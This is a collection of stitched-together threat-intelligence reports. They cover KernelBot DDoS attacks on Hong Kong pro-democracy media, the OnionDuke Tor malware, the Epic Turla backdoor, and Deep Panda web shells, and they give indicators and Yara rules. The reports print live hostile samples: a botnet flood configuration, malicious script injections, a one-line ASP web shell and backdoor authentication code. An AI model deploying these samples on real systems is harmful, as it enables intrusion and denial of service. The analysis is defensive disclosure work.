[ KernelSetting ] IsReportState=0 IsDownFileRun0=0 CmdID0=1 DownFileRunUrl0= http://10.0.1.151/1.exe [ UpdateServer ] NewVersion=20140926 UpdateFileUrl= http://10.0.1.151/1.exe [ DDOS_HostStatistics ] CountUrl= Timer=2 [ DDOS_ScriptFlood ] IsScriptFlood=1 CmdID=123 ScriptFloodDNS= ScriptFloodUrl= http://nxapi.appledaily.com.hk / ScriptFloodPort=80 IsGetUrlFile=1 IsSendPacket=0 ThreadLoopTime=5 ThreadCount=10 Timer=360 IsTimer=1 [ DDOS_ScriptFlood_A1 ] IsScriptFlood=0 CmdID=1 ScriptFloodDNS= 10.0.1.151 ScriptFloodUrl= 10.0.1.151/1.html ScriptFloodPort=80 IsGetUrlFile=1 IsSendPacket=1 ThreadLoopTime=1 ThreadCount=1 Timer=20 IsTimer=1 [ DDOS_UdpFlood ] IsUdpFlood=0 CmdID=1 UdpFloodDNS= 10.0.1.151 ThreadCount=1 Timer=20 IsTimer=1 [ DDOS_UdpFlood_A1 ] IsUdpFlood=0 CmdID=1 UdpFloodDNS= 10.0.1.151 ThreadCount=1 Timer=20 IsTimer=1 [ DDOS_SynFlood ] IsSynFlood=0 CmdID=1 SynFloodDNS= 10.0.1.151 SynFloodPort=80 ThreadCount=1 Timer=20 IsTimer=1 [ DDOS_TcpFlood ] IsTcpFlood=0 CmdID=1 TcpFloodDNS= 10.0.1.151 TcpFloodPort=80 IsSendPacket=1 ThreadCount=1 Timer=20 IsTimer=1 [ DDOS_TcpFlood_A1 ] IsTcpFlood=0 CmdID=1 TcpFloodDNS= 10.0.1.151 TcpFloodPort=80 IsSendPacket=1 ThreadCount=6 Timer=20 IsTimer=1 .
During the course of our research , we ’ ve observed more than 30 different unique configuration files issued by the C2 servers listed above .
These configurations issued commands to attack the following domains and IPs :
nxapi.appledaily.com.hk 202.85.162.90 58.64.139.10 202.85.162.97 202.85.162.81 198.41.222.6 202.85.162.101 202.85.162.95 202.85.162.180 202.85.162.140 202.85.162.130 124.217.214.149 .
All of the above IPs host Next Media or Apple daily websites , with the exception of 58.64.139.10 and 124.217.214.149 .
The IP 58.64.139.10 has hosted hkgolden.com – the domain for the HKGolden forum mentioned above .
For approximately 14 hours between October 23rd and 24th , the attackers pushed a configuration update to four controls servers that instructed bots under their control to flood 124.217.214.149 with UDP traffic .
The IP 124.217.214.149 hosted the attacker controlled domain p.java-sec.com .
On Oct .
23 , 2014 , two of the active controls began instructing participating bots to cease attacks .
By Oct .
24 , 2014 , all five of the known active control servers were issuing commands to cease the attacks .
It should come as no surprise that hkgolden.com , nextmedia.com , and appledaily.com.hk websites are now or previously have been blocked by the Great Firewall of China – indicating that the PRC has found the content hosted on these sites objectionable .
Links to Previous Activity .
The most direct connection between these DDoS attacks and previous APT activity is the use of the QTI International and CallTogether code signing certificates , which we have seen in malware attributed to APT activity .
The QTI International digital certificate has been previously used to sign binaries used in APT activity including Operation Poisoned Hurricane .
Specifically , 17bc9d2a640da75db6cbb66e5898feb1 is a PlugX variant signed by the QTI International certificate .
This PlugX variant connected to a Google Code project at code.google.com/p/udom/ , where it decoded a command that configured its C2 server .
The sample 0b54ae49fd5a841970b98a078968cb6b was signed with the QTI International certificate as well .
This sample was first observed during a drive-by attack in June 2014 , and was downloaded from java-se.com/jp.jpg .
This sample is detected as Backdoor.APT.Preshin and connected to luxscena.com for C2 .
The QTI International certificate was also used to sign e2a4b96cce9de4fb126cfd5f5c73c3ed .
We detect this payload as Backdoor.APT.PISCES and it used hk.java-se.com for C2 .
The java-se.com website was previously used in other attacks targeting the pro-democracy movement in Hong Kong .
We first observed the presence of malicious javascript inserted into Hong Kong Association for Democracy and People ’ s Livelihood on June 26 , 2014 , which appeared as the following :
< a href= '' http : //www.adpl.org.hk/ ? p=2680 '' title= '' 抗議九巴加價要求凍結加價、改善服務 < script language=javascript src= http://java-se.com/o.js > .
`` > .
More recently , as noted by Claudio Guarnieri , the website of the Democratic Party of Hong Kong was seen hosting a redirect to the same malicious javascript .
The CallTogether certificate has been used to sign ecf21054ab515946a812d1aa5c408ca5 .
We also detect this payload as Backdoor.APT.PISCES and observed it connect to u.java-se.com .
Both of these certificates are valid but can be detected and blocked via the following Yara signatures :
rule callTogether_certificate { meta : author = `` Fireeye Labs '' version = `` 1.0 '' reference_hash = `` d08e038d318b94764d199d7a85047637 `` description = “ detects binaries signed with the CallTogether certificate ” strings : $ serial = { 452156C3B3FB0176365BDB5B7715BC4C } $ o = `` CallTogether , Inc . '' condition : $ serial and $ o } rule qti_certificate { meta : author = `` Fireeye Labs '' reference_hash = `` cfa3e3471430a0096a4e7ea2e3da6195 `` description = `` detects binaries signed with the QTI International Inc certificate '' strings : $ cn = `` QTI International Inc '' $ serial = { 2e df b9 fd cf a0 0c cb 5a b0 09 ee 3a db 97 b9 } condition : $ cn and $ serial } .
These ongoing DDoS attacks and previous APT intrusion activity both target the hkgolden.com website .
As noted above , this site has been targeted with a DDoS attack by a KernelBot network .
We also found that the hkgolden.com website was compromised on Sept .
5 , 2014 and had a redirect to a malicious javascript again hosted at another jave-se.com host , which appeared as follows :
document.write ( `` < script language=javascript src= http://jre76.java-se.com/js/rss.js > .
Finally , as noted above the IP 124.217.214.149 was seen hosting the domain p.java-sec.com between Oct .
25 , 2014 and Oct .
27 , 2014 .
As Brandon Dixon noted here , the java-sec.com domain is linked to the java-se.com by shared hosting history at the following IP address :
124.248.237.26 223.29.248.9 211.233.89.182 112.175.143.2 112.175.143.9 .
It is unclear why these actors would attack an IP address they were actively using .
It ’ s possible that the attackers wanted to test their botnet ’ s capability by attacking an IP they were using to gather statistics on the size of the attack .
It is also possible that the attackers simply made a mistake and accidentally issued commands to attack their own infrastructure .
On Oct .
24 , 2014 , after attacking their own infrastructure , the attackers issued new instructions to their botnet that ceased all attacks .
Conclusion .
While not conclusive , the evidence presented above shows a link between confirmed APT activity and ongoing DDoS attacks that appear to be designed to silence the Pro Democracy movement in Hong Kong .
The evidence does not conclusively prove that the same actors responsible for the DDoS attacks are also behind the observed intrusion activity discussed above – such as Operation Poisoned Hurricane .
Rather , the evidence may indicate that a common quartermaster supports both the DDoS attacks and ongoing intrusion activity .
In either scenario , there is a clear connection between the intrusion activity documented in Operation Poisoned Hurricane and the DDOS attacks documented here .
While the tactics of these activities are very different from a technical perspective , each supports distinct political objectives .
Operation Poisoned Hurricane ’ s objective appeared to have in part been IP theft possibly for economic gain or other competitive advantages .
In the DDOS attacks , the objective was to silence free speech and suppress the pro democracy movement in Hong Kong .
The Chinese government is the entity most likely to be interested in achieving both of these objectives .
APPENDIX .
MD5s .
c3d6450075d618b1edba17ee723eb3ca d08e038d318b94764d199d7a85047637 84bd0809b1dbc2dc86f30d30faaa7e4e 39bb90140fc0101f49377b6c60076f9d caa5529010c17b969da01ade084794c6 17bc9d2a640da75db6cbb66e5898feb1 0b54ae49fd5a841970b98a078968cb6b e2a4b96cce9de4fb126cfd5f5c73c3ed ecf21054ab515946a812d1aa5c408ca5 .
HOSTNAMES .
tommo.jp mizma.co.jp sp.you-maga.com nitori-tour.com ninekobe.com shinzenho.jp wizapply.com www.credo-biz.com www.sapporo-digital-photoclub.com wakayamasatei.com luxscena.com java-se.com hk.java-se.com u.java-se.com jre76.java-se.com p.java-sec.com .
This entry was posted in Threat Intelligence , Threat Research and tagged advanced malware , Cybersecurity , malware , zero-day by Ned Moran , Mike Oppenheim and Mike Scott .
Bookmark the permalink .
OnionDuke : APT Attacks Via the Tor Network F-Secure Weblog : News from the Lab .
Recently , research was published identifying a Tor exit node , located in Russia , that was consistently and maliciously modifying any uncompressed Windows executables downloaded through it .
Naturally this piqued our interest , so we decided to peer down the rabbit hole .
Suffice to say , the hole was a lot deeper than we expected ! In fact , it went all the way back to the notorious Russian APT family MiniDuke , known to have been used in targeted attacks against NATO and European government agencies .
The malware used in this case is , however , not a version of MiniDuke .
It is instead a separate , distinct family of malware that we have since taken to calling OnionDuke .
But lets start from the beginning .
When a user attempts to download an executable via the malicious Tor exit node , what they actually receive is an executable `` wrapper '' that embeds both the original executable and a second , malicious executable .
By using a separate wrapper , the malicious actors are able to bypass any integrity checks the original binary might contain .
Upon execution , the wrapper will proceed to write to disk and execute the original executable , thereby tricking the user into believing that everything went fine .
However , the wrapper will also write to disk and execute the second executable .
In all the cases we have observed , this malicious executable has been the same binary ( SHA1 : a75995f94854dea8799650a2f4a97980b71199d2 , detected as Trojan-Dropper : W32/OnionDuke.A ) .
This executable is a dropper containing a PE resource that pretends to be an embedded GIF image file .
In reality , the resource is actually an encrypted dynamically linked library ( DLL ) file .
The dropper will proceed to decrypt this DLL , write it to disk and execute it .
A flowchart of the infection process .
Once executed , the DLL file ( SHA1 : b491c14d8cfb48636f6095b7b16555e9a575d57f , detected as Backdoor : W32/OnionDuke.B ) will decrypt an embedded configuration ( shown below ) and attempt to connect to hardcoded C & C URLs specified in the configuration data .
From these C & Cs the malware may receive instructions to download and execute additional malicious components .
It should be noted , that we believe all five domains contacted by the malware are innocent websites compromised by the malware operators , not dedicated malicious servers .
A screenshot of the embedded configuration data .
Through our research , we have also been able to identify multiple other components of the OnionDuke malware family .
We have , for instance , observed components dedicated to stealing login credentials from the victim machine and components dedicated to gathering further information on the compromised system like the presence of antivirus software or a firewall .
Some of these components have been observed being downloaded and executed by the original backdoor process but for other components , we have yet to identify the infection vector .
Most of these components do n't embed their own C & C information but rather communicate with their controllers through the original backdoor process .
One component , however , is an interesting exception .
This DLL file ( SHA1 d433f281cf56015941a1c2cb87066ca62ea1db37 , detected as Backdoor : W32/OnionDuke.A ) contains among its configuration data a different hardcoded C & C domain , overpict.com and also evidence suggesting that this component may abuse Twitter as an additional C & C channel .
What makes the overpict.com domain interesting , is it was originally registered in 2011 with the alias of `` John Kasai '' .
Within a two-week window , `` John Kasai '' also registered the following domains : airtravelabroad.com , beijingnewsblog.net , grouptumbler.com , leveldelta.com , nasdaqblog.net , natureinhome.com , nestedmail.com , nostressjob.com , nytunion.com , oilnewsblog.com , sixsquare.net and ustradecomp.com .
This is significant because the domains leveldelta.com and grouptumbler.com have previously been identified as C & C domains used by MiniDuke .
This strongly suggests that although OnionDuke and MiniDuke are two separate families of malware , the actors behind them are connected through the use of shared infrastructure .
A visualization of the infrastructure shared between OnionDuke and MiniDuke .
Based on compilation timestamps and discovery dates of samples we have observed , we believe the OnionDuke operators have been infecting downloaded executables at least since the end of October 2013 .
We also have evidence suggesting that , at least since February of 2014 , OnionDuke has not only been spread by modifying downloaded executables but also by infecting executables in .torrent files containing pirated software .
However , it would seem that the OnionDuke family is much older , both based on older compilation timestamps and also on the fact that some of the embedded configuration data make reference to an apparent version number of 4 suggesting that at least three earlier versions of the family exist .
During our research , we have also uncovered strong evidence suggesting that OnionDuke has been used in targeted attacks against European government agencies , although we have so far been unable to identify the infection vector ( s ) .
Interestingly , this would suggest two very different targeting strategies .
On one hand is the `` shooting a fly with a cannon '' mass-infection strategy through modified binaries and , on the other , the more surgical targeting traditionally associated with APT operations .
In any case , although much is still shrouded in mystery and speculation , one thing is certain .
While using Tor may help you stay anonymous , it does at the same time paint a huge target on your back .
It 's never a good idea to download binaries via Tor ( or anything else ) without encryption .
The problem with Tor is that you have no idea who is maintaining the exit node you are using and what their motives are .
VPNs ( such as our Freedome VPN ) will encrypt your connection all the way through the Tor network , so the maintainers of Tor exit nodes will not see your traffic and ca n't tamper with it .
Samples :
• a75995f94854dea8799650a2f4a97980b71199d2 • b491c14d8cfb48636f6095b7b16555e9a575d57f • d433f281cf56015941a1c2cb87066ca62ea1db37 .
Detected as : Trojan-Dropper : W32/OnionDuke.A , Backdoor : W32/OnionDuke.A , and Backdoor : W32/OnionDuke.B .
Post by — Artturi ( @ lehtior2 ) .
The EpicTurla Operation : Solving some of the mysteries of Snake/Uroboros Kaspersky Lab Global Research and Analysis Team Version 1.0 August 6 , 2014 2 .
Technical appendix : malware samples and indicators of compromise ( IOC ) .
A .
Keylogger module .
File name : varies MD5 : a3cbf6179d437909eb532b7319b3dafe Compilation timestamp : 2012.10.02 10:51:50 ( GMT ) Compiler : Microsoft Visual Studio 2010 File format : PE32 DLL Exports : LowLevelKeyboardProc @ 12 Creates the log file : % TEMP % \~DFD3O8.tmp .
If failed , tries to write to the file f : \keyhook.log Each time the keylogger starts , it appends the following header to the log file : New Session : % fully qualified computer name % % timestamp % It then creates a hidden console window and registers its only export LowLevelKeyboardProc @ 12 as a hook procedure for low-level keyboard input events ( WH_KEYBOARD_LL hook ) .
Depending on the results , it writes a line to its log file .
In case the hook was installed , the line is “ Started ” , else “ LoadLibrary ‘ % path to its file % ’ failed , % error code % ” .
It also starts a thread that retrieves the current foreground window handle every 100 milliseconds .
This handle is then used in the keyboard hook procedure .
The low-level keyboard hook procedure intercepts WM_KEYDOWN , WM_KEYUP and WM SYSKEYDOWN system messages and writes information about each keystroke to the log file .
Every time a new window becomes active , it retrieves its name and the path to its application and writes this information to the log file : [ % path to the application ’ s executable file % : “ % window title % ” ] .
TLP : Green For any inquire please contact intelreports @ kaspersky.com 3 .
B .
The “ Epic/Tavdig/Wipbot ” backdoor ( Main backdoor module ) .
Analyzed file ( others are similar ) : Compilation timestamp : 2013.10.15 10:43:09 ( GMT ) File format : PE32 DLL , modified ( the file is supposed to be started by a custom loader ) Exports :
1000837F : ModuleStart 100083A9 : ModuleStop 100083BB : start .
The main functionality is implemented in a single function that is called by the DllMain entry point .
The exported functions allow to call the same function directly ( exported as “ start ” ) or to start/stop it in a separate thread ( “ ModuleStart ” / ” ModuleStop ” ) and with slightly different parameters .
This indicates the backdoor can also function as a plugin for the Turla Carbon system .
The main function executes in an infinite loop .
It collects most of the available information about the system , transmits it to the C & C server and executes the commands it receives back .
The module delays execution for random periods while it discovers running processes with one of the following filenames :
• tcpdump.exe • windump.exe • ethereal.exe • wireshark.exe • ettercap.exe • snoop.exe • dsniff.exe .
The following system information is collected :
1 .
Hardware information .
• Registry key HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SystemInformation , value names : SystemManufacturer , SystemProductName .
• All registry subkeys of the key HARDWARE\DESCRIPTION\System\CentralProcessor , value name : ProcessorNameString .
• Available system memory status , total/free .
2 .
OS version information ; the newest version known to it is Windows 7 / 2008R2 .
Unidentified versions are marked as “ not support this version of Windows ” .
3 .
Computer name ( “ ComputerNamePhysicalDnsFullyQualified ” ) .
TLP : Green For any inquire please contact intelreports @ kaspersky.com 4 .
4 .
User name , local group name .
5 .
Common directory names : system , current , temporary directories .
6 .
Additional system information : • System and user language settings • User locale information : country name , current date , time zone .
• Uptime 7 .
Disk space information for all available logical drives .
8 .
List of available network shares .
9 .
List of all user accounts , privilege classes , time of the last logon .
10 .
List of current IPV4 TCP connections and UDP listeners .
11 .
Information about installed Windows updates from the file % WINDOWS % \SoftwareDistribution\ReportingEvents.log .
12 .
Detailed list of running processes and their owners .
13 .
List of all window titles .
14 .
Directory listing of available logical drives and of the directories : • Desktop • % TEMP % • % WINDOWS % \Temp .
The retrieved information is compressed using bzip2 , encrypted with AES and then encoded using Base64 before being transmitted to the C & C server .
When there is a file waiting for upload ( usually , this is file that contains the results of the previously received and executed command ) , it is read from disk and uploaded to the server instead of the system information .
The C & C communication is implemented on top of the standard HTTP/HTTPS protocols .
The list of the C & C URLs is hardcoded in the binary but may be overridden by further commands .
C & C server communication cycle .
TLP : Green For any inquire please contact intelreports @ kaspersky.com 5 .
The module uses Wininet API functions for issuing HTTP POST requests to the server .
The module transmits the collected information in the body of the POST request and gets new commands from the server ’ s response .
The request body can be empty if there is no new information to upload .
The response is usually an HTML document and the commands are Base64-encoded strings enclosed in .
/ .
tags .
Every command is encrypted using asymmetric encryption with temporary AES session keys .
Each command is a mixed text/binary buffer .
It consists of two parts : payload and configuration .
The configuration is an INI file that controls the further behavior of the module .
It is extracted into a temporary file named % TEMP % \~D % random % .tmp .
The payload , if exists , is supposed to be an executable file and may be executed if there is a corresponding command present in the INI part .
The format of the decoded command is the following :
Format of the C & C command buffer Available commands are :
Name Description Execute a command , redirect its output to the file % TEMP % \~D % random % .tmp .
exe The file is then uploaded during the next C & C communication cycle .
down Change the C & C URL to a given value .
del_task Delete a file .
Set the filename that is supposed to contain the results of command result execution .
Effectively , any existing file may be marked for upload by this command .
TLP : Green For any inquire please contact intelreports @ kaspersky.com 6 .
Name Description delete Mark the file % TEMP % \~tmp085.dat to be deleted on reboot .
name Set the filename to be deleted or created ( depends on other parameters ) .
TLP : Green For any inquire please contact intelreports @ kaspersky.com 7 .
C .
Malware samples .
Lateral movement tools :
a3cbf6179d437909eb532b7319b3dafe custom keylogger 1369fee289fe7798a02cde100a5e91d8 UPX compressed “ dnsquery.exe ” c0c03b71684eb0545ef9182f5f9928ca dnsquery.exe .
Epic/Tavdig backdoors :
4dc22c1695d1f275c3b6e503a1b171f5 111ed2f02d8af54d0b982d8c9dd4932e 7731d42b043865559258464fe1c98513 24b354f8cfb6a181906ceaf9a7ec28b0 fdba4370b60eda1ee852c6515da9da58 3ab3d463575a011dfad630da154600b5 a347af5cc3c5429911e5167b2d30e1ac 6b207521c9175d2274ba3debcc700a1d cb264c9efa566f41975a3cebf903efb5 e9c0d32a15a24b1110fcc18ab04a6738 d102e873971aa4190a809039bc789e4d d7ca9cf72753df7392bfeea834bcf992 dropped by the Java CVE-2012-1723 exploits 42b7b0bd4795fc8e336e1f145fc2d27c ab686acde338c67bec8ab42519714273 8e90d8b68a053d22b54fb39f1cf01a41 d22b0ec4e9b2302c07f38c835a78148a 764d643e5cdf3b8d4a04b50d0bc44660 d31f1d873fa3591c027b54c2aa76a52b ea1c266eec718323265c16b1fdc92dac bc2eff0a1544e74462e7377cf0de5a36 d22b0ec4e9b2302c07f38c835a78148a 86f28e8d9d6bda11abcf93b76074b311 d28661163ae91848e01a733836bfe0aa 09b7f890ccded1a6210119df8a9a08f9 5c4a51ce7aa76579616a01a0a3cfab38 aa58167c57cac1bc562c77766ca249f5 3a785ede87bfbd2c1c29887e9c36c801 7731d42b043865559258464fe1c98513 0e441602449856e57d1105496023f458 .
TLP : Green For any inquire please contact intelreports @ kaspersky.com 8 .
Dropper packages that installs both Epic and Turla Carbon system :
c7617251d523f3bc4189d53df1985ca9 Postanovlenie apelljacionnoj instancii.scr 0f76ef2e6572befdc2ca1ca2ab15e5a1 Opredelenie.scr .
PDF exploits used in spearphishing attacks drops Epic backdoor :
6776bda19a3a8ed4c2870c34279dbaa9 Note_№107-41D.pdf dba209c99df5e94c13b1f44c0f23ef2b unknown.PDF f44b1dea7e56b5eac95c12732d9d6435 unknown.PDF 4c65126ae52cadb76ca1a9cfb8b4ce74 unknown.PDF .
SCR/EXE files used in spearphishing/social engineering :
4d667af648047f2bd24511ef8f36c9cc NATO position on Syria.scr ab686acde338c67bec8ab42519714273 Russia position on Syria.scr 1c3634c7777bd6667936ec279bac5c2a Talking Points.scr 80323d1f7033bf33875624914a6a6010 Program.scr 77083b1709681d43a1b0503057b6f096 Security protocol.scr 01a15540481f28163e7b4908034efbe3 unknown.exe ( “ WorldCupSec ” ) 6a24071fde3b5d713c58801dcdd62044 unknown.exe ( “ WorldCupSec ” ) 626955d20325371aca2742a70d6861ab unknown.exe ( “ TadjMakhal ” ) 16eba8e5f0440a213935e1af4976d801 unknown.exe ( “ RussiaPositions ” ) 0c35a8f9f9b6ab2f7e3b4408abc61f73 pdfview.exe d685403d000f8f6b25a6746f6f05a51c winword.exe .
Fake “ Adobe Flash Player ” Epic backdoor installers :
7c52c340ec5c6f57ef2fd174e6490433 adobe_flash_player.exe 030f5fdb78bfc1ce7b459d3cc2cf1877 Shockwave_Flash_Player.exe .
Fake “ Microsoft Security Essentials Quick Scan ” Epic backdoor installer .
89b0f1a3a667e5cd43f5670e12dba411 .
Turla Carbon Pfinet backdoors .
e9580b6b13822090db018c320e80865f Pfinet backdoor 071d3b60ebec2095165b6879e41211f2 Pfinet backdoor .
TLP : Green For any inquire please contact intelreports @ kaspersky.com 9 .
Turla Carbon package .
cb1b68d9971c2353c2d6a8119c49b51f .
Related Turla sample module .
626576e5f0f85d77c460a322a92bb267 .
Java Exploits used in waterhole attacks .
536eca0defc14eff0a38b64c74e03c79 f41077c4734ef27dec41c89223136cf8 15060a4b998d8e288589d31ccd230f86 e481f5ea90d684e5986e70e6338539b4 21cbc17b28126b88b954b3b123958b46 acae4a875cd160c015adfdea57bd62c4 .
TLP : Green For any inquire please contact intelreports @ kaspersky.com 10 .
D .
Epic C & C Server URLs ( hacked sites used as 1st level proxies ) :
http://losdivulgadores.com/wp-content/plugins/wp-themes / http://gspersia.com/first/fa/components/com_sitemap / http://blog.epiccosplay.com/wp-includes/sitemap / http://gofree.ir/wp-content/plugins/online-chat / http://homaxcompany.com/components/com_sitemap / http://www.hadilotfi.com/wp-content/themes/profile / http://mortezanevis.ir/wp-content/plugins/wp-static / http://ncmp2014.com/modules/mod_feed/feed / http://mebroad.com/wp-content/gallery/posters/img / http://gruenerenate.de/wp-content/plugins/bbpress/includes/lang / http://www.arshinmalalan.com/themes/v6/templates/css/in.php http://products.parentsupermarket.com/phpMyAdmin / http://c-si.ir/includes / http://mkiyanpoor.ir/wp-includes / http://www.massage-ketsch.de/wp-includes / http://onereliablesource.com/wp-content/plugins/sitemap / http://petrymantenimiento.com/wp-content/plugins/wordpress-form-manager/lang / http://ohsoverydarling.com/wp-content/themes/verification / http://poissonnerieantoine.com/web/wp-content/themes/titan/view / http://www.gholghola.com/azemashoorhost/smarty/tmpl / http://www.saglikdetay.com/wp-includes/images/icons / http://www.entesharati.com/wp-content/plugins/edd-paginate / http://iranabad.com/sarzamin/cms/application/classess/plugins / http://deltateam.ir/components/com_sitemap / http://akva-clean.ru/typo3temp / http://discontr.com/wp-content/themes/twentytwelve / http://curaj.net/pepeni/images / http://executrek.org/components/com_sitemap / http://amoodgostar.com/wp-content/themes/simplebanner / http://gayamore.com/gallery/090607 / http://www.automation-net.ru/typo3temp / http://www.lacitedufleuve.com/Connections1 / http://www.aspit.sn/administrator/modules/mod_feed / .
TLP : Green For any inquire please contact intelreports @ kaspersky.com 11 .
E .
Intermediary level proxies ( hacked sites used as 2nd/3rd level ) :
http://masterciw.com / http://khrn.tk/wp-includes / http://pradlolux.cz/system/helper / http://original-key.com/catalog/controller/payment / http://www.noraci.com/wp-includes / http://tuvpr.com/backup/wp-includes / http://www.boshraamin.com/wp-includes / http://www.bestjob.my/system/modules/comments / http://rollinghillsfitness.com/wp-includes / .
TLP : Green For any inquire please contact intelreports @ kaspersky.com 12 .
F .
Motherships , hosting Epic Control panels and exploits .
http://avg-update.sytes.net / http://newsforum.servehttp.com / http://newsweek.servehttp.com / http://adobe.faqserv.com / http://cqcount.servehttp.com / http://easycounter.sytes.net / http://newsweek.serveblog.net / http://image.servepics.com / http://bgl.serveftp.net / .
TLP : Green For any inquire please contact intelreports @ kaspersky.com .
Mo ' Shells Mo ' Problems Deep Panda Web Shells .
Disclaimer : CrowdStrike derived this information from investigations in non-classified environments .
Since we value our client 's privacy and interests , some data has been redacted or sanitized .
Crowdstrike presents “ Mo ’ Shells Mo ’ Problems ” A four part series featuring two unique web shells used by a Chinese threat group we call DeepPanda .
The series will culminate with a CrowdCast in April 2014 detailing a case study of the incident response investigation conducted to identify these web shells .
Special thanks to Josh Phillips of the CrowdStrike Global Intelligence Team for providing the technical analysis in this blog post .
Today we ’ ll cover part one of this series , which provides an overview of what web shells are , functionality of two web shells recently identified during an incident response investigation and how they were leveraged by the attacker .
Parts two through four will provide details on successful analytical techniques you can use to discover web shells within your environment :
Mo ’ Shells Mo ’ Problems : Deep Panda Web Shells ( Part 1 ) Mo ’ Shells Mo ’ Problems : File Stacking ( Part 2 ) Mo ’ Shells Mo ’ Problems : Web Log Review ( Part 3 ) Mo ’ Shells Mo ’ Problems : Network Detection ( Part 4 ) .
A Web Shell is a file containing backdoor functionality written in a web scripting language such ASP , ASPX , PHP or JSP .
When a web shell is hosted on an internet facing victim system , an adversary can remotely access the system to perform malicious actions .
Deep Panda is a China based threat group CrowdStrike has observed targeting companies in the defense , legal , telecommunication and financial industries .
Crowdstrike has observed Deep Panda adopting web shells as their primary access back into a victim organization .
This is an interesting shift as web shells have typically been seen as only a first stage into obtaining a persistent foothold in an environment .
Previously , web shells were quickly abandoned once persistent second stage malware was successfully beaconing .
Using a web shell as a primary backdoor gives Deep Panda several advantages :
Low to virtually no detection by antivirus products The absence of command and control beacon traffic Impossible to block known malicious IP addresses to a web server since adversary can easily change their source IP address Cookie and HTTP header authentication aware web shells avoid being enumerated by search engines and restrict access , further reducing their network footprint .
To assist organizations with identifying web shells in their environment , this post will cover two popular Deep Panda web shells .
By gaining insight into their capabilities and footprint , organizations should find it feasible to detect and remediate these backdoors .
Showimg.asp .
Path : E : \inetpub\wwwroot\ .
\ MD5 Hash : ffa82c64720179878b25793f17b304d7 File Size : 28 .
Table 1 : `` Showimg.asp '' Metadata .
Showimg.asp is an example of an early stage web shell used to build an initial foothold within a network .
After it is replaced by more robust backdoors , it may be left in place as a last resort should remediation take place .
At a diminutive 28 bytes , it is one of the smallest Active Server Page ( ASP ) backdoors in the wild .
In a recent case , we witnessed this web shell written to a standalone file ( named showimg.asp ) , but it could easily be injected into an existing page , making it even stealthier .
The code for this web shell can be found below :
< % execute request ( chr ( 42 ) ) % > .
Table 2 : `` Showimg.asp '' Web Shell Script .
ASP uses Microsoft Visual Basic ( VBScript ) as its implementation language .
The code above uses the chr ( ) function to convert an integer into a character , which is then passed as an argument to the ASP Request ( ) object .
The Request ( ) object will search the Query String for any keys matching the input .
In our case , the code is equivalent to Request.QueryString ( ‘ * ’ ) .
The request object will look for chr ( 42 ) which is an asterisk ( * ) , returning whatever is passed to it in a HTTP GET or POST .
Next , the Execute ( ) function will execute any value returned by the lookup .
Effectively , an attacker can form a request that will execute any VBScript code .
As you might imagine , this is a powerful capability .
For example , this code can perform any of the following actions :
File upload or download File system read , write , or delete Arbitrary command execution .
This web shell is an example of a “ thick client ” shell , meaning that while the server side code is quite small , attackers typically use a larger GUI client to construct the sent commands .
The client GUI runs on the attacker ’ s system and hence is not typically found within the victim network .
As a simple example of an encoded command , the following GET request would cause the backdoor to execute the code Response.Write ( “ < h1 > Hello World < /h1 > ” ) and would render “ Hello World ” to be printed in the web browser :
http : // .
/showimage.asp * = % 52 % 65 % 73 % 70 % 6F % 6E % 73 % 65 % 2E % 57 % 72 % 69 % 74 % 65 % 28 % 22 % 3C % 68 % 31 % 3E % 48 % 65 % 6C % 6C % 6F % 20 % 57 % 6F % 72 % 6C % 64 % 3C % 2F % 68 % 31 % 3E % 22 % 29 .
Table 3 : `` showimg.asp '' Web Shell Script .
System_web.aspx .
Path : C : \inetpub\wwwroot\aspnet_client\system_web\ .
\ MD5 Hash : cc875db104a602e6c12196fe90559fb6 File Size : 45187 Table 4 : Metadata of `` system_web.aspx '' System_web.aspx is an excellent example of a more robust web shell used to replace Deep Panda ’ s traditional beaconing command and control infrastructure .
It is an ASP.NET backdoor written in C # , with far more capabilities than we saw with the showimage.asp sample .
The web shell supports a form of authentication to protect against unauthorized access .
This prevents its discovery from search engine indexing , vulnerability scanning tools and other unauthorized access to the backdoor .
In order to bypass authentication , a user session must satisfy one of three options :
Pass a cookie with the name .
Set the Keep-Alive HTTP header to 320 Set language HTTP header to contain es-DN .
Since web shells are text-based , we can easily see how this authentication takes place :
try { Init ( ) ; if ( ! IsUserValid ( ) ) { try { int.Parse ( Request.Cookies [ `` REDACTED '' ] .Value ) ; Page.Visible = true ; } catch ( Exception ) { Page.Visible = false ; Response.Clear ( ) ; Response.End ( ) ; } } else { Page.Visible = true ; Response.SetCookie ( new HttpCookie ( `` REDACTED '' , DateTime.Now.Second.ToString ( ) ) ) ; } } catch ( Exception ) { Page.Visible = false ; Response.End ( ) ; } private void Init ( ) { try { if ( Request.Cookies [ `` cp '' ] ! = null ) { File.Copy ( Request.PhysicalPath , Request.Cookies [ `` cp '' ] .Value , true ) ; Response.Cookies [ `` cp '' ] .Expires = DateTime.Now.AddDays ( -1 ) ; Response.End ( ) ; } } catch ( Exception ex ) { Log ( ex.ToString ( ) ) ; } } private bool IsUserValid ( ) if ( Request.Headers [ `` Keep-Alive '' ] == `` 320 '' ) return true ; if ( Request.UserLanguages.Length > 0 ) foreach ( string s in Request.UserLanguages ) if ( s.IndexOf ( `` es-DN '' ) > = 0 ) return true ; catch ( Exception ) return false ;
Table 5 : `` system_web.aspx '' Authentication Code .
First , the code checks if a cookie by the name of cp exists .
If so , the response object has its End ( ) method invoked , denying the user access .
Next , the code uses the IsValidUser ( ) method and checks the Hyper Text Transport Protocol ( HTTP ) headers for the Keep-Alive value , which , if equal to 320 , will return true .
If the value does not equal 320 the IsValidUser ( ) method iterates over the Request.UserLanguages collection searching for a language named es-DN , and if found , the IsValidUser ( ) method will return true .
If neither check passes , the code returns false and the code will finally check for the presence of a cookie named .
If the cookie is present , the authentication step is satisfied .
If not , a blank web page with no content is displayed .
After successful authentication , the attacker is provided with the following page :
System_web.aspx packs a large amount of functionality into a compact interface .
It provides the following capabilities :
Enumerate attached drives Utilize built in SQL functions to connect to database backend Run SQL queries and statements Download , upload and read files Directory listing Execute Active Directory requests Compile and execute arbitrary C # source code Impersonate a user .
The web shell supports 8 main commands , with most command execution via Transact-SQL using the xp_cmdshell function .
Exec .
This command depends on the contents of the first unlabeled textbox1 .
If unlabeled textbox1 is empty , the code will enumerate attached drives .
Provider= or Driver= Will connect using the OleDbConnection class .
Data Source= The code will connect using the SqlConnection class .
iis : // If this appears in unlabeled textbox1 , the code will use data from the second unlabeled textbox2 to execute Active Directory requests .
Down .
This command also depends on the text contained in the unlabeled textbox1 .
